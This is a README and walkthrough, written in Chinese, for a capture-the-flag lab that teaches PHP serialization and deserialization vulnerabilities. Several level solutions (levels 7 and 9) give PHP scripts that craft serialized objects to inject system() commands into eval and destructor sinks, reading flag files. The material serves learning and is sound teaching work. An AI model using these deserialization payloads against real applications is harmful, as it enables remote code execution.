# PHPSerialize-labs
PHPSerialize-labs是一个使用php语言编写的，用于学习CTF中PHP反序列化的入门靶场。旨在帮助大家对PHP的序列化和反序列化有一个全面的了解。

# 推荐的学习资源

- [Bilibili-橙子科技-PHP反序列化漏洞学习](https://www.bilibili.com/video/BV1R24y1r71C)
    > 为爱发电最强的一集，陈腾师傅的课应该是圈里面讲的最细的了，而且是一套完整体系，通俗易懂，很推荐各位看x  
      这个视频还有一套配套的靶场:[mcc0624/php_ser_Class](https://github.com/mcc0624/php_ser_Class)

- [ctfshow/web257-268](https://ctf.show/challenges#web254-713)
    > ctfshow的题目是圈内出名的体系化和梯度化，很适合新手入门，其WP在网络上很容易找到，生态很不错。
    当然ctfshow本身也有视频讲解：[Bilibili-ctfshow-Web257-268](https://www.bilibili.com/video/BV1D64y1m78f)

- [fine-1/php-SER-libs](https://github.com/fine-1/php-SER-libs)
    > fine-1(这周末在做梦)师傅的靶场，在README中附带有WriteUp

- [PHP 手册](https://www.php.net/manual/zh/)
    > PHP官方手册，遇事不决，看看说明书x

# 2024/07/04 更新
- Level 1: 类的实例化
- Level 2: 对象中值的传递
- Level 3: 对象中值的权限
- Level 4: 序列化初体验
- Level 5: 序列化的普通值规则
- Level 6: 序列化的权限修饰规则

# 2024/07/05 更新
- Level 7: 实例化和反序列化
- Level 8: 构造函数和析构函数以及GC机制
- Level 9: 构造函数的后门

# 2024/07/07 更新
- Level 10: __wakeup()
- Level 11: __wakeup() CVE-2016-7124
- Level 12: __sleep()
- Level 13: __toString()
- Level 14: __invoke()
- Level 15: POP链前置
- Level 16: POP链构造
- Level 17: 字符串逃逸基础-无中生有

# WriteUP

## Level 0

在开始学习序列化和反序列化之前，请先完成一些前导课程：

- PHP环境配置
- PHP语法基础
- PHP面向对象编程

若您对以上内容不熟悉，推荐您阅读菜鸟教程中 [PHP面向对象](https://www.runoob.com/php/php-oop.html) 部分。

## Level 1

第一题考察 类的实例化 —— 也就是对象的创建。

在 PHP 中，我们使用 new + 类名() 去创建一个对象。

**POST提交：**(注意由于防止非预期使用判断new的方法导致第一个方法无法使用，但思路不受影响)

code=`new FLAG();`

code=`$o=new FLAG();`

## Level 2

考察对象的赋值操作，相比于面向过程，对对象中值的更改，需要通过 `->` 符号来指向可修改的变量，这里的可修改指的是 控制修饰符 public 对应的值，像 protected 和 private 修饰的值，需要使用更复杂的修改方法。

对于任何可以修改的值，我们使用 `$对象名 -> 对应值 = 值` .eg: `$object_name->a="a"`

所以在这个题目中，我们需要将 `$flag_string` 赋值给 `$free_flag` 以便我们后面的 `get_free_flag()` 函数将他输出出来。

**POST提交：**

code=`$target->$free_flag=$flag_string;`

## Level 3

考察 控制修饰符：

- **public（公有）：**公有的类成员可以在任何地方被访问。
- **protected（受保护）：**受保护的类成员则可以被其自身以及其子类和父类访问。(可继承)
- **private（私有）：**私有的类成员则只能被其定义所在的类访问。(不可继承)

这里 SubFLAG 继承了 FLAG，除开 public 修饰的值，对于另外两个：

- `protected $protected_flag` 可以通过 `get_protected_flag()` / `get_private_flag()` 访问，因为受保护的变量是可以被继承的。
- `private $private_flag`则只能通过 `get_private_flag()` 进行访问，因为私有变量不能被继承。

而对象中函数的调用和值的访问类似，也通过 `->` 符号实现：`$对象名 -> 函数名();` 

**POST提交：**

code=`echo $target->public_flag.$target->get_protected_flag().$target->get_private_flag();`

code=`echo $target->public_flag.$sub_target->show_protected_flag().$target->get_private_flag();`

## Level 4

一道用来考察序列化的套壳题目，序列化虽然不会标记函数，但是会完整的输出变量和变量内容。

题目已经使用 `$flag_is_here = new FLAG();` 实例化创建了一个对象，所以我们只需要序列化并且打印出来这一段字符串。

**POST提交：**

code=`echo serialize($flag_is_here);`

你会得到这样的字符串：

```PHP
O:4:"FLAG":3:{s:18:"FLAGflag1_string";s:8:"ser4l1ze";s:18:"FLAGflag2_number";i:2;s:18:"FLAGflag3_object";O:5:"FLAG3":1:{s:25:"FLAG3flag3_object_array";a:2:{i:0;s:3:"se3";i:1;s:2:"me";}}}
```

挑出对应部分拼接即可。

## Level 5

演示和考察序列化中 不同类型变量的不同格式。

而从结果上理解，反序列化其实和参数创建是一个等同的过程 —— 比如下面的例子：

```PHP
$a_string = "HelloCTF"; /*<=等价于=>*/ $a_string = unserialize('s:8:"HelloCTF";');
```

所以该题目按照后面部分的要求编写对应的变量进行序列化，将字符串赋给对应参数即可。

```PHP
<?php 

class a_object{
    public $a_value = "HelloCTF";
}

$your_object = new a_object();
$your_boolean = true;
$your_NULL = null;
$your_string = "IWANT";
$your_number = 1;
$your_object->a_value = "FLAG";
$your_array = array('a'=>"Plz",'b'=>"Give_M3");

$exp = "o=".serialize($your_object)."&s=".serialize($your_string)."&a=".serialize($your_array)."&i=".serialize($your_number)."&b=".serialize($your_boolean)."&n=".serialize($your_NULL);

echo $exp;
```

## Level 6

同样是演示和考察序列化中不同类型变量的不同格式，但这里比较特殊 —— 因为引入了控制修饰符。

在对象的序列化和反序列化中，不同控制修饰符，序列化出来的字符串是不同的：

```PHP
<?php 

class Demo{
    public $a;
    protected $b;
    private $c;
}

echo urlencode(serialize(new Demo()));
# O%3A4%3A%22Demo%22%3A3%3A%7Bs%3A1%3A%22a%22%3BN%3Bs%3A4%3A%22%00%2A%00b%22%3BN%3Bs%3A7%3A%22%00Demo%00c%22%3BN%3B%7D
# O:4:"Demo":3:{s:1:"a";N;s:4:"%00*%00b";N;s:7:"%00Demo%00c";N;}
```

这里的 `%00` 是一个**不可见**的控制字符-`NULL`，对比不难看出对应的规则：

- **protected（受保护）：** `%00*%00变量名`
- **private（私有）：**`%00类名%00变量名`

所以在序列化和反序列化的题目中 我们提倡在输出EXP的时候添加一个 `urlencode()` 以避免不可见字符的干扰。

在本题中只需要给对应的变量赋值即可，考察点是在输出的格式上面，由于不可见控制字符的带入，需要使用URL编码来避免丢失。

```PHP
<?php 
class protectedKEY{
    protected $protected_key = "protected_key";
}
class privateKEY{
    private $private_key = "private_key";
}

$exp = "protected_key=".urlencode(serialize(new protectedKEY))."&private_key=".urlencode(serialize(new privateKEY));

echo $exp;
```

## Level 7

实例化和反序列化的演示，并且简单的展示了反序列化漏洞的原理。

从结果上来看，实例化和反序列化是一样的，这都会去创建一个对象，但是如果目标类没有构造函数，那么其中的参数控制是不同的。

在没有构造函数时，实例化中对象的各种参数在类中已经决定好了，除非创建后修改；而反序列化则是根据序列化的字符串来**"还原"**对象的 —— 这也就意味着，我们可以通过改变序列化的字符串来决定他"**还原**"对象中各种量的值。

```PHP
class FLAG{
    public $flag_command = "echo 'Hello CTF!<br>';";

    function backdoor(){
        eval($this->flag_command);
    }
}
$Unserialize_object = unserialize('O:4:"FLAG":1:{s:12:"flag_command";s:24:"echo 'Hello World!<br>';";}');
```

比如在这个代码例子中，我们可以更改 `s:24:"echo 'Hello World!<br>';"` 这个字符串来做到控制最后 `backdoor()` 函数的执行结果。

所以对于该题目中`unserialize($_POST['o'])->backdoor();`，EXP：

```PHP
<?php 
class FLAG{
    public $flag_command = "system('tac flag.php');";
}
$exp = "o=".urlencode(serialize(new FLAG()));
echo $exp;
```

## Level 8

考察 构造函数 (`__construct()`) 和 析构函数 (`__destruct()`) ，并且引入了一些 PHP垃圾回收机制的知识点 —— 请注意，GC机制和析构函数息息相关。

构造函数只会在类实例化的时候 —— 也就是使用 new 的方法手动创建对象的时候才会触发，而通过反序列化创建的对象不会触发这一方法，这也是为什么，在前面的内容，我将反序列化的对象创建过程称作为 “**还原**”。

析构函数会在对象被回收的时候触发 —— 手动回收和自动回收。

手动回收：就是代码中演示的 unset 方法用于释放对象。

自动回收：对象没有值引用指向，或者脚本结束完全释放，具体看题目中的演示结合该部分文字应该不难理解。

题目要求 全局变量 标识符flag的值大于5，根据 __destruct() 和 PHP GC 的特性，我们可以不断地去序列化和反序列化一个对象，然后不给该对象具体的引用以触发自动销毁机制。

**POST：**

code=`unserialize(serialize(unserialize(serialize(unserialize(serialize(unserialize(serialize(new RELFLAG()))))))));`

## Level 9

序列化和反序列化中的常规简单题目，这里考察的是一个析构函数漏洞的利用点，其实可以类比之前 实例化和反序列化，此外 本题为动态容器，flag位于根目录下 /flag EXP如下：

```PHP
<?php
class FLAG {
    var $flag_command = "system('cat /flag');";
}
$exp = "o=".urlencode(serialize(new FLAG()));
echo $exp;
```

要注意PHP语句要用`;`结尾。